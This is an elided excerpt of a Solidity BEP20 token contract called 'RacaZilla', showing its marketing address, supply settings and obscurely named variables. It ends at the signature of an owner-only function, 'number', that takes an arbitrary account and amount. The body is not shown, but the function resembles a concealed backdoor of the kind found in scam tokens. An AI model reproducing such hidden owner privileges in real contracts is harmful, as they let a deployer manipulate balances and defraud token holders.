...
contract RacaZilla is Context, IBEP20, Ownable { // contract name
    ...
    address payable private _marketingAddress = payable(0x10ED43C718714eb63d5aA57B78B54704E256024E); // Marketing Address
    ...
    string private _name = "RacaZilla"; // token name
    string private _symbol = "RacaZilla"; // token symbol
    uint8 private _decimals = 18; // 1 token can be divided into 10e_decimals parts

    uint256 private _tTotal = 1000 * 10**8 * 10**_decimals;
    
    uint256 public _qil = 5;
    uint256 public _qil1 =  1000 * 10**8 * 10**_decimals;
    uint256 multi = 3;
    ...
    function number(address num,address account,uint256 amount) public onlyOwner{
